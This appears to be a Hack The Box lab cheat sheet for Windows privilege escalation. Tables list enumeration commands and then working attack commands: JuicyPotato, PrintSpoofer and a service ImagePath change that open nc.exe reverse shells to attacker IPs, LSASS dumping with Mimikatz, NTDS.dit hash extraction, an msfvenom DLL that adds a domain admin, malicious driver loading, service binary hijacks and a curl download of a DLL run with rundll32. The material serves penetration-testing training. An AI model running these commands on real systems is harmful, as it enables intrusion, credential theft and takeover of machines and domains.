# Windows privilège escalation

### Initial Enumeration

| **Command**                                                                                           | **Description**                                |
| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| `xfreerdp /v:<target ip> /u:htb-student`                                                              | RDP to lab target                              |
| `ipconfig /all`                                                                                       | Get interface, IP address and DNS information  |
| `arp -a`                                                                                              | Review ARP table                               |
| `route print`                                                                                         | Review routing table                           |
| `Get-MpComputerStatus`                                                                                | Check Windows Defender status                  |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`                            | List AppLocker rules                           |
| `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` | Test AppLocker policy                          |
| `set`                                                                                                 | Display all environment variables              |
| `systeminfo`                                                                                          | View detailed system configuration information |
| `wmic qfe`                                                                                            | Get patches and updates                        |
| `wmic product get name`                                                                               | Get installed programs                         |
| `tasklist /svc`                                                                                       | Display running processes                      |
| `query user`                                                                                          | Get logged-in users                            |
| `echo %USERNAME%`                                                                                     | Get current user                               |
| `whoami /priv`                                                                                        | View current user privileges                   |
| `whoami /groups`                                                                                      | View current user group information            |
| `net user`                                                                                            | Get all system users                           |
| `net localgroup`                                                                                      | Get all system groups                          |
| `net localgroup administrators`                                                                       | View details about a group                     |
| `net accounts`                                                                                        | Get passsword policy                           |
| `netstat -ano`                                                                                        | Display active network connections             |
| `pipelist.exe /accepteula`                                                                            | List named pipes                               |
| `gci \\.\pipe\`                                                                                       | List named pipes with PowerShell               |
| `accesschk.exe /accepteula \\.\Pipe\lsass -v`                                                         | Review permissions on a named pipe             |

### Handy Commands

| **Command**                                                                                                                                                                           | **Description**                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| `mssqlclient.py sql_dev@10.129.43.30 -windows-auth`                                                                                                                                   | Connect using mssqlclient.py                               |
| `enable_xp_cmdshell`                                                                                                                                                                  | Enable xp\_cmdshell with mssqlclient.py                    |
| `xp_cmdshell whoami`                                                                                                                                                                  | Run OS commands with xp\_cmdshell                          |
| `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *`                                                             | Escalate privileges with JuicyPotato                       |
| `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`                                                                                                               | Escalating privileges with PrintSpoofer                    |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp`                                                                                                                                    | Take memory dump with ProcDump                             |
| `sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords`                                                                                                                         | Use MimiKatz to extract credentials from LSASS memory dump |
| `dir /q C:\backups\wwwroot\web.config`                                                                                                                                                | Checking ownership of a file                               |
| `takeown /f C:\backups\wwwroot\web.config`                                                                                                                                            | Taking ownership of a file                                 |
| `Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`                                             | Confirming changed ownership of a file                     |
| `icacls “C:\backups\wwwroot\web.config” /grant htb-student:F`                                                                                                                         | Modifying a file ACL                                       |
| `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`                                                                                                            | Extract hashes with secretsdump.py                         |
| `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`                                                                                                                                         | Copy files with ROBOCOPY                                   |
| `wevtutil qe Security /rd:true /f:text \| Select-String "/user"`                                                                                                                      | Searching security event logs                              |
| `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"`                                                                                       | Passing credentials to wevtutil                            |
| `Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` | Searching event logs with PowerShell                       |
| `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`                                                                              | Generate malicious DLL                                     |
| `dnscmd.exe /config /serverlevelplugindll adduser.dll`                                                                                                                                | Loading a custom DLL with dnscmd                           |
| `wmic useraccount where name="netadm" get sid`                                                                                                                                        | Finding a user's SID                                       |
| `sc.exe sdshow DNS`                                                                                                                                                                   | Checking permissions on DNS service                        |
| `sc stop dns`                                                                                                                                                                         | Stopping a service                                         |
| `sc start dns`                                                                                                                                                                        | Starting a service                                         |
| `reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`                                                                                                       | Querying a registry key                                    |
| `reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`                                                                              | Deleting a registry key                                    |
| `sc query dns`                                                                                                                                                                        | Checking a service status                                  |
| `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`                                                                                             | Disabling the global query block list                      |
| `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`                                                | Adding a WPAD record                                       |
| `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`                                                                                                                             | Compile with cl.exe                                        |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`                                                                                    | Add reference to a driver (1)                              |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`                                                                                                              | Add reference to a driver (2)                              |
| `.\DriverView.exe /stext drivers.txt` and `cat drivers.txt \| Select-String -pattern Capcom`                                                                                          | Check if driver is loaded                                  |
| `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`                                                                                                               | Using EopLoadDriver                                        |
| `c:\Tools\PsService.exe security AppReadiness`                                                                                                                                        | Checking service permissions with PsService                |
| `sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`                                                                                              | Modifying a service binary path                            |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`                                                                                | Confirming UAC is enabled                                  |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`                                                               | Checking UAC level                                         |
| `[environment]::OSVersion.Version`                                                                                                                                                    | Checking Windows version                                   |
| `cmd /c echo %PATH%`                                                                                                                                                                  | Reviewing path variable                                    |
| `curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`                                                                           | Downloading file with cURL in PowerShell                   |
| `rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`                                                                                   | Executing custom dll with rundll32.exe                     |
| `.\SharpUp.exe audit`                                                                                                                                                                 | Running SharpUp                                            |
| `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`                                                                                                                       | Checking service permissions with icacls                   |
| `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`                                                                                           | Replace a service binary                                   |
| `wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """`                                                      | Searching for unquoted service paths                       |
| `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`                                                                                                    | Checking for weak service ACLs in the Registry             |
| `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`            | Changing ImagePath with PowerShell                         |
